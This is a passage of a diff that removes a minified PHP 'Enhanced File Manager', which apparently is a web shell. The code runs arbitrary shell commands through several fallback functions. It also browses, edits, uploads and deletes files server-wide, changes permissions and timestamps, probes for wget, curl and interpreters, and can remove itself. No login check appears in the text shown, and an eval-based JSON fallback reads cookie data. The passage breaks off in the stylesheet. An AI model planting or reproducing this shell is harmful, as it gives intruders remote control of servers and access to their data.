@@ -1,1 +1,630 @@
-<?php error_reporting(0);@ini_set('display_errors',0);@ini_set('default_charset','UTF-8');header('Content-Type: text/html; charset=UTF-8');if(!function_exists('json_encode')){function json_encode($data){switch(gettype($data)){case 'NULL':return 'null';case 'boolean':return $data?'true':'false';case 'integer':case 'double':return $data;case 'string':return '"'.addcslashes($data,"\\\"\n\r\t/").'"';case 'array':if(array_keys($data)===range(0,count($data)-1)){$output=array();foreach($data as $value){$output[]=json_encode($value);}return '['.implode(',',$output).']';}else{$output=array();foreach($data as $key=>$value){$output[]=json_encode(strval($key)).':'.json_encode($value);}return '{'.implode(',',$output).'}';}default:return 'null';}}}if(!function_exists('json_decode')){function json_decode($json,$assoc=false){if($json==='null')return null;if($json==='true')return true;if($json==='false')return false;if(is_numeric($json))return floatval($json);if($json[0]==='"')return stripslashes(substr($json,1,-1));if($json[0]==='{'||$json[0]==='['){$json=str_replace(array('null','true','false'),array('NULL','TRUE','FALSE'),$json);$json=preg_replace('/([{,])(\s*)([^":\s]+)(\s*):/','$1$2"$3"$4:',$json);$result=@eval('return '.$json.';');return $result;}return null;}}if(!function_exists('file_put_contents')){function file_put_contents($filename,$data,$flags=0){$mode=($flags&8)?'a':'w';$fp=fopen($filename,$mode);if(!$fp)return false;if($flags&1)flock($fp,2);$bytes=fwrite($fp,$data);if($flags&1)flock($fp,3);fclose($fp);return $bytes;}}if(!defined('PHP_OS_FAMILY')){if(strtoupper(substr(PHP_OS,0,3))==='WIN'){define('PHP_OS_FAMILY','Windows');}elseif(strtoupper(substr(PHP_OS,0,6))==='DARWIN'){define('PHP_OS_FAMILY','Darwin');}else{define('PHP_OS_FAMILY','Linux');}}if(!function_exists('mb_detect_encoding')){function mb_detect_encoding($str,$encoding_list=null,$strict=false){if(function_exists('iconv')){$encodings=array('UTF-8','ASCII','ISO-8859-1','Windows-1252');foreach($encodings as $encoding){if(@iconv($encoding,$encoding,$str)===$str){return $encoding;}}}return 'UTF-8';}}if(!function_exists('mb_convert_encoding')){function mb_convert_encoding($str,$to_encoding,$from_encoding=null){if(function_exists('iconv')&&$from_encoding){return@iconv($from_encoding,$to_encoding,$str);}return $str;}}if(!function_exists('mb_check_encoding')){function mb_check_encoding($str,$encoding=null){if(!$encoding)$encoding='UTF-8';if(function_exists('iconv')){return@iconv($encoding,$encoding,$str)===$str;}return true;}}define('BASEZERO_ALPHABET','ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789');session_start();$script_dir=__DIR__;$isWindows=(PHP_OS_FAMILY==='Windows');function basezero_encoder($input){$alphabet=BASEZERO_ALPHABET;$base=strlen($alphabet);$output='';$len=strlen($input);for($i=0;$i<$len;$i++){$val=ord($input[$i]);$output.=$alphabet[(int)($val/$base)].$alphabet[$val%$base];}return $output;}function basezero_decoder($input){if(strlen($input)%2!=0)return false;$alphabet=BASEZERO_ALPHABET;$base=strlen($alphabet);$output='';$map=array_flip(str_split($alphabet));for($i=0;$i<strlen($input);$i+=2){if(!isset($map[$input[$i]])||!isset($map[$input[$i+1]]))return false;$val=($map[$input[$i]]*$base)+$map[$input[$i+1]];$output.=chr($val);}return $output;}function normalize_path($path){return str_replace(array('/','\\'),DIRECTORY_SEPARATOR,$path);}function get_parent_directory($path){$parent=dirname($path);return($parent!==$path&&$parent!=='.')?$parent:null;}function format_size($bytes){if($bytes===false||!is_numeric($bytes))return 'N/A';$units=array('B','KB','MB','GB','TB');$i=0;while($bytes>=1024&&$i<4){$bytes/=1024;$i++;}return round($bytes,2).' '.$units[$i];}function get_permissions($file){clearstatcache(true,$file);$perms=fileperms($file);if($perms===false)return '----';return decoct($perms&0777);}function get_owner_info($path){global $isWindows;if($isWindows){return 'system';}if(function_exists('posix_getpwuid')&&file_exists($path)){$owner_info=@posix_getpwuid(@fileowner($path));$group_info=@posix_getgrgid(@filegroup($path));$owner=$owner_info?$owner_info['name']:@fileowner($path);$group=$group_info?$group_info['name']:@filegroup($path);return $owner.':'.$group;}else{return(file_exists($path)?@fileowner($path).':'.@filegroup($path):'?:?');}}function get_file_content_mixed($file){if(!is_readable($file)||!is_file($file)){return false;}$filesize=filesize($file);if($filesize===false)return false;$max_size=10*1024*1024;if($filesize>$max_size){return array('error'=>true,'message'=>"File too large to edit (".format_size($filesize)."). Maximum: ".format_size($max_size),'type'=>'error');}$content=file_get_contents($file);if($content===false)return false;$printable_count=0;$content_length=strlen($content);$check_length=min($content_length,1024);for($i=0;$i<$check_length;$i++){$char=ord($content[$i]);if(($char>=32&&$char<=126)||$char==9||$char==10||$char==13){$printable_count++;}}$printable_ratio=$check_length>0?($printable_count/$check_length):0;if($printable_ratio>0.5){if(function_exists('mb_detect_encoding')){$detected=mb_detect_encoding($content,array('UTF-8','ASCII','ISO-8859-1','Windows-1252'),true);if($detected&&$detected!=='UTF-8'){$content=mb_convert_encoding($content,'UTF-8',$detected);}}return array('content'=>$content,'type'=>'mixed','size'=>$filesize,'encoding'=>'raw','printable_ratio'=>round($printable_ratio*100,1));}else{return array('content'=>bin2hex($content),'type'=>'binary','size'=>$filesize,'encoding'=>'hex','printable_ratio'=>round($printable_ratio*100,1));}}function save_file_content_mixed($file,$content,$file_type='mixed',$encoding='raw'){if($file_type==='binary'&&$encoding==='hex'){if(strlen($content)%2!==0){return false;}$binary_content=@pack('H*',$content);if($binary_content===false){return false;}return file_put_contents($file,$binary_content,LOCK_EX)!==false;}else{if(function_exists('mb_check_encoding')){if(!mb_check_encoding($content,'UTF-8')){$content=mb_convert_encoding($content,'UTF-8','auto');}}return file_put_contents($file,$content,LOCK_EX)!==false;}}function execute_command($command,$working_directory=null){$original_dir=null;if($working_directory&&is_dir($working_directory)){$original_dir=getcwd();chdir($working_directory);}$command=$command.' 2>&1';$output='';$methods=array('shell_exec','exec','system','passthru','popen');foreach($methods as $method){if(!function_exists($method))continue;try{switch($method){case 'shell_exec':$output=@shell_exec($command);break;case 'exec':$exec_output=array();@exec($command,$exec_output);$output=implode("\n",$exec_output);break;case 'system':ob_start();@system($command);$output=ob_get_clean();break;case 'passthru':ob_start();@passthru($command);$output=ob_get_clean();break;case 'popen':$handle=@popen($command,'r');if($handle){while(!feof($handle)){$output.=fread($handle,4096);}pclose($handle);}break;}if($output!==null&&$output!==''){if($original_dir)chdir($original_dir);return array('success'=>true,'output'=>$output,'method'=>$method);}}catch(Exception $e){continue;}}if($original_dir)chdir($original_dir);return array('success'=>false,'output'=>'All command execution methods failed or are disabled.','method'=>'none');}function create_tar_gz($files,$archive_name,$current_dir){try{$archive_path=$current_dir.DIRECTORY_SEPARATOR.$archive_name.'.tar';if(!class_exists('PharData')){return false;}$phar=new PharData($archive_path);$added_files=0;foreach($files as $file_path){if(!file_exists($file_path))continue;if(is_dir($file_path)){$phar->buildFromDirectory($file_path,'/./');}else{$phar->addFile($file_path,basename($file_path));}$added_files++;}if($added_files===0){@unlink($archive_path);return false;}$phar->compress(Phar::GZ);@unlink($archive_path);return true;}catch(Exception $e){@unlink($archive_path);@unlink($archive_path.'.gz');return false;}}function delete_recursive($path){if(is_file($path)||is_link($path))return unlink($path);if(!is_dir($path))return false;$files=array_diff(scandir($path),array('.','..'));foreach($files as $file)delete_recursive($path.DIRECTORY_SEPARATOR.$file);return rmdir($path);}function copy_recursive($source,$dest){if(is_file($source))return copy($source,$dest);if(!is_dir($dest))mkdir($dest,0755,true);$files=array_diff(scandir($source),array('.','..'));foreach($files as $file)copy_recursive($source.DIRECTORY_SEPARATOR.$file,$dest.DIRECTORY_SEPARATOR.$file);return true;}function compare_file_names($a,$b){return strcasecmp($a['name'],$b['name']);}function get_file_list($dir){$items=array();$parent=get_parent_directory($dir);if($parent){$items[]=array('name'=>'..','type'=>'dir','path'=>$parent,'size'=>'','owner'=>'','perms'=>'','modified'=>'','is_parent'=>true,'permission_status'=>'readable');}$files=@scandir($dir);if(!$files)return $items;$dirs=array();$regular_files=array();foreach($files as $file){if($file==='.'||$file==='..')continue;$full_path=$dir.DIRECTORY_SEPARATOR.$file;$readable=is_readable($full_path);$writable=is_writable($full_path);$perm_status=!$readable?'denied':($writable?'writable':'readable');$item=array('name'=>$file,'path'=>$full_path,'owner'=>$readable?get_owner_info($full_path):'N/A','perms'=>$readable?get_permissions($full_path):'----','modified'=>$readable?date('Y-m-d H:i',@filemtime($full_path)):'N/A','is_parent'=>false,'permission_status'=>$perm_status);if(is_dir($full_path)){$item['type']='dir';$item['size']='';$dirs[]=$item;}else{$item['type']='file';$item['size']=$readable?format_size(@filesize($full_path)):'N/A';$item['is_zip']=in_array(strtolower(pathinfo($file,PATHINFO_EXTENSION)),array('zip','rar','7z','tar','gz'));$regular_files[]=$item;}}usort($dirs,'compare_file_names');usort($regular_files,'compare_file_names');return array_merge($items,$dirs,$regular_files);}if(!isset($_SESSION['cmd_history'])){$_SESSION['cmd_history']=array();}if(!function_exists('posix_getegid')){$user=function_exists('get_current_user')?@get_current_user():'unknown';$user=$user?$user:'unknown';$uid=function_exists('getmyuid')?@getmyuid():'?';$uid=$uid?$uid:'?';$gid=function_exists('getmygid')?@getmygid():'?';$gid=$gid?$gid:'?';$group="?";}else{$uid_data=@posix_getpwuid(@posix_geteuid());$gid_data=@posix_getgrgid(@posix_getegid());$user=$uid_data?$uid_data['name']:'unknown';$uid=$uid_data?$uid_data['uid']:'?';$group=$gid_data?$gid_data['name']:'?';$gid=$gid_data?$gid_data['gid']:'?';}$server_checks=array('MySQL'=>function_exists('mysql_connect')||function_exists('mysqli_connect')||class_exists('PDO'),'Perl'=>!empty(@shell_exec('perl -v 2>&1')),'Python'=>!empty(@shell_exec('python --version 2>&1'))||!empty(@shell_exec('python3 --version 2>&1')),'WGET'=>!empty(@shell_exec('wget --version 2>&1')),'CURL'=>function_exists('curl_version'));$ajax_action=isset($_GET['action'])?$_GET['action']:'';if($ajax_action==='list'||$ajax_action==='get_content'||$ajax_action==='terminal_cmd'||$ajax_action==='open_file_by_path'){header('Content-Type: application/json; charset=UTF-8');if($ajax_action==='open_file_by_path'){$file_path=isset($_POST['file_path'])?trim($_POST['file_path']):'';$current_path=isset($_POST['current_path'])?normalize_path($_POST['current_path']):getcwd();if(empty($file_path)){echo json_encode(['success'=>false,'message'=>'Please enter a file path.']);exit;}if(substr($file_path,0,1)!=='/'&&substr($file_path,1,1)!==':'){$full_path=$current_path.DIRECTORY_SEPARATOR.$file_path;}else{$full_path=$file_path;}$full_path=normalize_path($full_path);if(!file_exists($full_path)){echo json_encode(['success'=>false,'message'=>"File not found: $file_path"]);exit;}if(is_dir($full_path)){echo json_encode(['success'=>false,'message'=>"Path is a directory, not a file: $file_path"]);exit;}if(!is_readable($full_path)){echo json_encode(['success'=>false,'message'=>"File is not readable: $file_path"]);exit;}$result=get_file_content_mixed($full_path);if($result===false||isset($result['error'])){echo json_encode(['success'=>false,'message'=>'Could not read file content.']);exit;}echo json_encode(['success'=>true,'action'=>'open_editor','file_path'=>$full_path,'filename'=>basename($full_path),'content'=>$result['content'],'file_type'=>$result['type'],'file_size'=>$result['size'],'encoding'=>$result['encoding'],'printable_ratio'=>isset($result['printable_ratio'])?$result['printable_ratio']:null,'permissions'=>get_permissions($full_path),'owner'=>get_owner_info($full_path),'modified'=>date('Y-m-d H:i',filemtime($full_path))]);exit;}if($ajax_action==='terminal_cmd'){$command=isset($_POST['c'])?trim($_POST['c']):'';$current_path=isset($_POST['current_path'])?normalize_path($_POST['current_path']):getcwd();if(empty($command)){echo json_encode(array('success'=>false,'output'=>'No command provided.'));exit;}if(!in_array($command,$_SESSION['cmd_history'])){array_unshift($_SESSION['cmd_history'],$command);$_SESSION['cmd_history']=array_slice($_SESSION['cmd_history'],0,50);}$result=execute_command($command,$current_path);$result['history']=$_SESSION['cmd_history'];echo json_encode($result);exit;}if($ajax_action==='list'){$raw_path=isset($_GET['path'])?$_GET['path']:'';$path=$raw_path?basezero_decoder($raw_path):getcwd();if(!$path){echo json_encode(array('success'=>false,'message'=>'Path decoding failed'));exit;}$path=str_replace(array('/','\\'),DIRECTORY_SEPARATOR,$path);if(!file_exists($path)){echo json_encode(array('success'=>false,'message'=>"Path does not exist: '$path'"));exit;}if(!is_dir($path)){echo json_encode(array('success'=>false,'message'=>"Not a directory: '$path'"));exit;}$path_status=!is_readable($path)?'denied':(is_writable($path)?'writable':'readable');$files_data=get_file_list($path);$breadcrumbs=array();if($isWindows){$normalized_path=str_replace('/',DIRECTORY_SEPARATOR,$path);$parts=explode(DIRECTORY_SEPARATOR,$normalized_path);$built_path='';foreach($parts as $i=>$part){if(empty($part))continue;if($i===0&&preg_match('/^[A-Za-z]:$/',$part)){$built_path=$part.DIRECTORY_SEPARATOR;$breadcrumbs[]=array('name'=>$part,'path'=>$built_path);}else{$built_path.=($built_path===''||substr($built_path,-1)===DIRECTORY_SEPARATOR)?$part:DIRECTORY_SEPARATOR.$part;$breadcrumbs[]=array('name'=>$part,'path'=>$built_path);}}}else{$parts=explode('/',$path);$built_path='';foreach($parts as $part){if(empty($part))continue;$built_path.='/'.$part;$breadcrumbs[]=array('name'=>$part,'path'=>$built_path);}}$clipboard=isset($_COOKIE['fm_clipboard'])?json_decode(stripslashes($_COOKIE['fm_clipboard']),true):null;echo json_encode(array('success'=>true,'path'=>array('current'=>$path,'permission_status'=>$path_status,'breadcrumbs'=>$breadcrumbs,'is_windows'=>$isWindows),'files'=>$files_data,'clipboard'=>$clipboard,'user'=>$user));exit;}if($ajax_action==='get_content'){$path=isset($_GET['path'])?basezero_decoder($_GET['path']):'';if(!$path||!file_exists($path)){echo json_encode(array('success'=>false,'message'=>'File not found.'));exit;}$result=get_file_content_mixed($path);if($result===false){echo json_encode(array('success'=>false,'message'=>'Could not read file.'));exit;}if(isset($result['error'])){echo json_encode(array('success'=>false,'message'=>$result['message']));exit;}echo json_encode(array('success'=>true,'content'=>$result['content'],'file_type'=>$result['type'],'file_size'=>$result['size'],'encoding'=>$result['encoding'],'printable_ratio'=>isset($result['printable_ratio'])?$result['printable_ratio']:null,'permissions'=>get_permissions($path),'owner'=>get_owner_info($path),'modified'=>date('Y-m-d H:i',filemtime($path))));exit;}}$message='';if($_SERVER['REQUEST_METHOD']==='POST'){$current_dir=isset($_POST['current_dir'])?normalize_path($_POST['current_dir']):getcwd();chdir($current_dir);$action=isset($_POST['action'])?$_POST['action']:'';$file=isset($_POST['file'])?normalize_path($_POST['file']):'';$selected_files=isset($_POST['selected_files'])?array_map('normalize_path',$_POST['selected_files']):array();$bulk_action=isset($_POST['bulk_action'])?$_POST['bulk_action']:'';$clipboard=isset($_COOKIE['fm_clipboard'])?json_decode(stripslashes($_COOKIE['fm_clipboard']),true):null;$redirect_hash=basezero_encoder($current_dir);if(isset($_POST['ajax'])){header('Content-Type: application/json; charset=UTF-8');$response=array('success'=>false,'message'=>'Unknown error.');if($action==='edit'&&$file&&isset($_POST['content'])){$file_type=isset($_POST['file_type'])?$_POST['file_type']:'mixed';$encoding=isset($_POST['encoding'])?$_POST['encoding']:'raw';if(save_file_content_mixed($file,$_POST['content'],$file_type,$encoding)){$response=array('success'=>true,'message'=>'File saved successfully.');}else{$response=array('success'=>false,'message'=>'Error: Unable to save file.');}}if(!empty($bulk_action)){$new_clipboard=$clipboard;if($bulk_action==='paste'&&$clipboard){$count=0;foreach($clipboard['sources']as $source){if(!file_exists($source))continue;$dest=$current_dir.DIRECTORY_SEPARATOR.basename($source);if($clipboard['action']==='copy'){if(copy_recursive($source,$dest))$count++;}elseif($clipboard['action']==='move'){if(rename($source,$dest))$count++;}}setcookie('fm_clipboard','',time()-3600,"/");$new_clipboard=null;$response=array('success'=>true,'message'=>"$count item(s) pasted.");}elseif(!empty($selected_files)){switch($bulk_action){case 'delete':$count=0;foreach($selected_files as $f)if(delete_recursive($f))$count++;$response=array('success'=>true,'message'=>"$count item(s) deleted.");break;case 'copy':case 'move':$clipboard_data=array('action'=>$bulk_action,'sources'=>$selected_files);setcookie('fm_clipboard',json_encode($clipboard_data),time()+3600,"/");$new_clipboard=$clipboard_data;$response=array('success'=>true,'message'=>count($selected_files)." item(s) added to clipboard.");break;case 'compress':$archive_name='archive-'.date('Y-m-d-His');if(create_tar_gz($selected_files,$archive_name,$current_dir)){$response=array('success'=>true,'message'=>"Created archive: {$archive_name}.tar.gz");}else{$response=array('success'=>false,'message'=>'Error: Could not create TAR.GZ archive. PharData may not be available.');}break;case 'download':$zip_name='download-'.date('Y-m-d-His').'.zip';$zip_path=$current_dir.DIRECTORY_SEPARATOR.$zip_name;try{$zip=new PharData($zip_path);$added_files=0;foreach($selected_files as $file_path){if(!file_exists($file_path))continue;if(is_dir($file_path)){$zip->buildFromDirectory($file_path,'/./');}else{$zip->addFile($file_path,basename($file_path));}$added_files++;}if($added_files>0){$response=array('success'=>true,'message'=>"Download ready: {$zip_name}",'download_file'=>$zip_name);}else{@unlink($zip_path);$response=array('success'=>false,'message'=>'No files to download.');}}catch(Exception $e){$response=array('success'=>false,'message'=>'Could not create download archive: '.$e->getMessage());}break;}}$response['clipboard']=$new_clipboard;}echo json_encode($response);exit;}if(isset($_FILES['upload_file'])){$uploaded=0;$errors=0;if(is_array($_FILES['upload_file']['name'])){for($i=0;$i<count($_FILES['upload_file']['name']);$i++){if($_FILES['upload_file']['error'][$i]===UPLOAD_ERR_OK){$target_file=$current_dir.DIRECTORY_SEPARATOR.basename($_FILES['upload_file']['name'][$i]);if(move_uploaded_file($_FILES['upload_file']['tmp_name'][$i],$target_file)){$uploaded++;}else{$errors++;}}else{$errors++;}}if($uploaded>0){$message="$uploaded file(s) uploaded successfully.";if($errors>0){$message.=" $errors file(s) failed.";}}else{$message="Error: No files could be uploaded.";}}else{if($_FILES['upload_file']['error']===UPLOAD_ERR_OK){$target_file=$current_dir.DIRECTORY_SEPARATOR.basename($_FILES['upload_file']['name']);if(move_uploaded_file($_FILES['upload_file']['tmp_name'],$target_file)){$message="File uploaded successfully.";}else{$message="Error: Unable to upload file.";}}else{$message="Error: Upload failed.";}}}if($action==='self_remove'&&isset($_POST['confirm'])&&$_POST['confirm']==='yes'){$script_file=__FILE__;if(unlink($script_file)){echo json_encode(array('success'=>true,'message'=>'File manager deleted.'));}else{echo json_encode(array('success'=>false,'message'=>'Could not delete file manager.'));}exit;}switch($action){case 'rename':if($file&&isset($_POST['new_name'])){$file_dir=dirname($file);$new_name=trim($_POST['new_name']);$new_path=$file_dir.DIRECTORY_SEPARATOR.$new_name;if(rename($file,$new_path)){$message="Renamed successfully.";}else{$message="Error: Unable to rename. Check permissions and ensure the new name doesn't already exist.";}}break;case 'chmod':if($file&&isset($_POST['perms'])&&!$isWindows){$perms=trim($_POST['perms']);if(preg_match('/^0?([0-7]{3,4})$/',$perms,$matches)){$desired_perms=octdec('0'.$matches[1]);$old_umask=umask(0);$chmod_result=chmod($file,$desired_perms);umask($old_umask);if($chmod_result){clearstatcache(true,$file);$actual_perms=decoct(fileperms($file)&0777);if($actual_perms===$matches[1]){$message="Permissions changed to $actual_perms successfully.";}else{$message="Permissions changed to $actual_perms (system constraints may apply).";}}else{$message="Error: Unable to change permissions. Check file ownership and server privileges.";}}else{$message="Error: Invalid permission format. Use 3-4 octal digits (e.g., 644, 0755).";}}elseif($isWindows){$message="Chmod has limited functionality on Windows. Windows uses ACLs instead of Unix permissions.";}break;case 'touch':if($file&&isset($_POST['datetime'])){if(touch($file,strtotime($_POST['datetime']))){$message="Timestamp updated successfully.";}else{$message="Error: Unable to update timestamp.";}}break;case 'create_file':if(!empty($_POST['filename'])){$new_file=$current_dir.DIRECTORY_SEPARATOR.$_POST['filename'];if(touch($new_file)){$message="File created successfully.";}else{$message="Error: Unable to create file.";}}break;case 'create_dir':if(!empty($_POST['dirname'])){$new_dir=$current_dir.DIRECTORY_SEPARATOR.$_POST['dirname'];if(mkdir($new_dir)){$message="Directory created successfully.";}else{$message="Error: Unable to create directory.";}}break;case 'execute_cmd':if(!empty($_POST['c'])){$result=execute_command($_POST['c'],$current_dir);$_SESSION['cmd_output']=$result['output'];}break;}if($message)$_SESSION['fm_message']=$message;header('Location: '.$_SERVER['PHP_SELF'].'#'.$redirect_hash);exit;}$action_get=isset($_GET['action'])?$_GET['action']:'';$file_get=isset($_GET['file'])?normalize_path($_GET['file']):'';if($action_get==='download'){if($file_get&&is_readable($file_get)){header('Content-Description: File Transfer');header('Content-Type: application/octet-stream');header('Content-Disposition: attachment; filename="'.basename($file_get).'"');header('Content-Length: '.filesize($file_get));ob_clean();flush();readfile($file_get);exit;}}if(isset($_SESSION['fm_message'])){$message=$_SESSION['fm_message'];unset($_SESSION['fm_message']);}$total_space=@disk_total_space($isWindows?substr(getcwd(),0,3):"/");$free_space=@disk_free_space($isWindows?substr(getcwd(),0,3):"/");$used_space=$total_space-$free_space;$disabled_functions=@ini_get("disable_functions");$icons=array('dir'=>'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 4H4c-1.11 0-2 .89-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V8c0-1.11-.9-2-2-2h-8l-2-2z"/></svg>','file'=>'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6zM6 20V4h7v5h5v11H6z"/></svg>','edit'=>'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04a.996.996 0 0 0 0-1.41l-2.34-2.34a.996.996 0 0 0-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/></svg>','rename'=>'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 4H6c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zM6 6h12v2H6V6zm0 4h8v2H6v-2zm0 4h10v2H6v-2z"/></svg>','chmod'=>'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-1.07 15.35L6.5 12.93l1.41-1.41L10.93 15l4.24-4.24L16.59 12l-5.66 5.35z"/></svg>','touch'=>'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm3.36 12.32l-4.24-2.53.01-6.44h1.75v5.21l3.41 2.03-1 1.73z"/></svg>','download'=>'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>','terminal'=>'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M2 3h20c1.1 0 2 .9 2 2v14c0 1.1-.9 2-2 2H2c-1.1 0-2-.9-2-2V5c0-1.1.9-2 2-2zm0 2v14h20V5H2zm2 2h2v2H4V7zm4 0h2v2H8V7z"/></svg>','home'=>'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>'); ?><!doctypehtml><html lang="en"><head><meta charset="UTF-8"><meta content="width=device-width,initial-scale=1"name="viewport"><title>Enhanced File Manager - Stable Final</title><link href="https://fonts.googleapis.com"rel="preconnect"><link href="https://fonts.gstatic.com"rel="preconnect"crossorigin><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap"rel="stylesheet"><style>:root{--bg-main:#1a1a1a;--bg-card:#242424;--bg-hover:rgba(45, 180, 140, 0.1);--bg-overlay:rgba(26, 26, 26, 0.95);--text-primary:#e0e0e0;--text-secondary:#a0a0a0;--text-muted:#707070;--border-color:#3a3a3a;--accent-primary:#2db48c;--accent-primary-hover:#3bc9a0;--color-green:#4caf50;--color-red:#f44336;--color-orange:#ff9800;--color-blue:#2196f3;--font-main:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;--font-mono:'JetBrains Mono','Courier New',monospace;--radius-base:8px;--radius-small:4px;--shadow-subtle:0 2px 8px rgba(0,0,0,0.4);--transition-fast:0.2s ease}*{box-sizing:border-box}body{font-family:var(--font-main);background-color:var(--bg-main);color:var(--text-primary);line-height:1.6;margin:0;padding:16px;font-size:14px}.container{max-width:1400px;margin:0 auto}.card{background-color:var(--bg-card);border:1px solid var(--border-color);border-radius:var(--radius-base);padding:20px;margin-bottom:16px;box-shadow:var(--shadow-subtle)}.server-info{font-family:var(--font-mono);font-size:12px;line-height:1.7;color:var(--text-secondary)}.server-info strong{color:var(--text-primary);font-weight:600}.server-info .highlight{color:var(--accent-primary);font-weight:700}.nav-bar{display:flex;align-items:center;gap:12px;margin:16px 0;flex-wrap:wrap}.path-bar{flex:1;background-color:var(--bg-card);border:1px solid var(--border-color);padding:8px 12px;border-radius:var(--radius-small);font-size:13px;word-break:break-all;min-width:0}.path-root{display:inline-flex;align-items:center;gap:4px;font-weight:600;margin-right:6px;color:var(--accent-primary);padding:2px 6px;border-radius:var(--radius-small);background-color:rgba(45,180,140,.15);transition:all var(--transition-fast);text-decoration:none}.path-root:hover{background-color:rgba(45,180,140,.25);color:var(--accent-primary-hover)}.path-root svg{width:14px;height:14px;fill:currentColor}.path-custom{color:#fff!important;background-color:rgba(255,255,255,.2)!important;font-weight:700!important;border-radius:4px!important;padding:2px 6px!important;margin:0 2px!important;text-shadow:0 1px 2px rgba(0,0,0,.5)}.path-status{margin-left:8px;font-weight:600;font-size:11px;text-transform:uppercase}.path-status.writable{color:var(--color-green)}.path-status.readable{color:var(--color-blue)}.path-status.denied{color:var(--color-red)}.nav-buttons{display:flex;gap:8px}.nav-buttons a,.nav-buttons button{background-color:var(--bg-card);color:var(--text-primary);padding:8px 12px;border-radius:var(--radius-small);font-weight:500;white-space:nowrap;transition:all var(--transition-fast);border:1px solid var(--border-color);cursor:pointer;text-decoration:none;font-size:13px;display:inline-flex;align-items:center;gap:6px}.nav-buttons a:hover,.nav-buttons button:hover{background-color:var(--accent-primary);color:var(--bg-main);border-color:var(--accent-primary)}.nav-buttons svg{width:16px;height:16px;fill:currentColor}.message{padding:12px 16px;margin-bottom:16px;border-radius:var(--radius-small);border:1px solid;background-color:var(--color-green);color:#fff;font-weight:500;animation:fadeIn .5s}.message.error{background-color:var(--color-red)}@keyframes fadeIn{from{opacity:0;transform:translateY(-10px)}to{opacity:1;transform:translateY(0)}}.action-forms{display:flex;flex-wrap:wrap;gap:12px;justify-content:center}.form-group{display:flex;gap:8px;align-items:center}.button,button,input,select{font-family:var(--font-main);font-size:13px;padding:8px 12px;border:1px solid var(--border-color);border-radius:var(--radius-small);background-color:var(--bg-main);color:var(--text-primary);transition:all var(--transition-fast)}input[type=text]:focus,select:focus,textarea:focus{outline:0;border-color:var(--accent-primary);box-shadow:0 0 0 2px rgba(45,180,140,.2)}.button,button{background-color:var(--accent-primary);color:#fff;border-color:var(--accent-primary);cursor:pointer;font-weight:500}.button:hover,button:hover{background-color:var(--accent-primary-hover);border-color:var(--accent-primary-hover)}.search-container{margin:16px 0}.search-container input{width:100%;max-width:400px;padding:10px 14px;font-size:14px}.file-table-container{background-color:var(--bg-card);border:1px solid var(--border-color);border-radius:var(--radius-base);overflow:hidden;box-shadow:var(--shadow-subtle)}.table-header-toolbar{padding:12px 16px;background-color:var(--bg-main);border-bottom:1px solid var(--border-color);display:flex;align-items:center;gap:12px}.file-table{width:100%;border-collapse:collapse;table-layout:fixed}.file-table td,.file-table th{padding:10px 12px;text-align:left;vertical-align:middle;border-bottom:1px solid var(--border-color)}.file-table th{background-color:var(--bg-main);color:var(--text-primary);font-weight:600;font-size:12px;text-transform:uppercase;letter-spacing:.5px}.file-table td{background-color:transparent;font-size:13px}.file-table tr:hover td{background-color:var(--bg-hover)}.file-table tr.selected td{background-color:var(--bg-hover)}.file-table tr.hidden{display:none}.col-select{width:40px}.col-name{width:35%}.col-size{width:10%}.col-owner{width:15%}.col-perms{width:8%}.col-date{width:15%}.col-actions{width:12%}.col-name>div{display:flex;align-items:center;gap:8px;min-width:0}.col-name a{color:var(--text-primary);text-decoration:none;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;flex:1;min-width:0}.col-name a:hover{color:var(--accent-primary)}.col-name svg{width:16px;height:16px;fill:var(--text-secondary);flex-shrink:0}.col-owner{font-family:var(--font-mono);font-size:11px;color:var(--text-secondary);word-break:break-word;line-height:1.3}.col-perms{font-family:var(--font-mono);font-size:12px}.perms-writable{color:var(--color-green);font-weight:600}.perms-readable{color:var(--color-blue)}.perms-denied{color:var(--color-red);font-weight:600}.text-actions{white-space:nowrap;display:flex;gap:4px;align-items:center;justify-content:flex-end}.text-actions a,.text-actions button{display:inline-flex;align-items:center;justify-content:center;width:28px;height:28px;background:0 0;border:1px solid transparent;cursor:pointer;color:var(--text-secondary);border-radius:var(--radius-small);transition:all var(--transition-fast);text-decoration:none;padding:0}.text-actions svg{width:14px;height:14px;fill:currentColor}.text-actions a:hover,.text-actions button:hover{color:var(--accent-primary);background-color:var(--bg-hover);border-color:var(--border-color)}#edit-view{display:none}#edit-view textarea{width:100%;min-height:50vh;font-family:var(--font-mono);background-color:var(--bg-main);color:var(--text-primary);border-radius:var(--radius-small);border:1px solid 